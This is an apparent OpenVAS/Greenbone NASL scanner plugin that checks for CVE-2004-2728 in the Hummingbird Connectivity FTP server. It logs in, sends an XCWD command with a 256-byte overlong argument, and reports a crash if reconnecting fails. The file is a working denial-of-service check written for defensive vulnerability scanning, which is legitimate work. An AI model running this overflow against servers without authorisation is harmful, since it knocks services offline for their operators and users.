# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15613");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"3.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:N/A:P");
  script_cve_id("CVE-2004-2728");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11542");
  script_xref(name:"OSVDB", value:"11133");
  script_name("Hummingbird Connectivity FTP service XCWD Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to a newer version when available.");

  script_tag(name:"summary", value:"The remote host is running the Hummingbird Connectivity FTP server.

  It was possible to shut down the remote FTP server by issuing
  a XCWD command followed by a too long argument.");

  script_tag(name:"impact", value:"This problem allows an attacker to prevent the remote site
  from sharing some resources with the rest of the world.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);

soc = open_sock_tcp(port);
if(soc)
{
  kb_creds = ftp_get_kb_creds();
  login = kb_creds["login"];
  password = kb_creds["pass"];

  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
    s = string("XCWD ", crap(256), "\r\n");
    send(socket:soc, data:s);
    r = recv_line(socket:soc, length:1024);
    close(soc);

    soc = open_sock_tcp(port);
    if(!soc)
    {
      security_message(port);
      exit(0);
    }
  }
  close(soc);
}
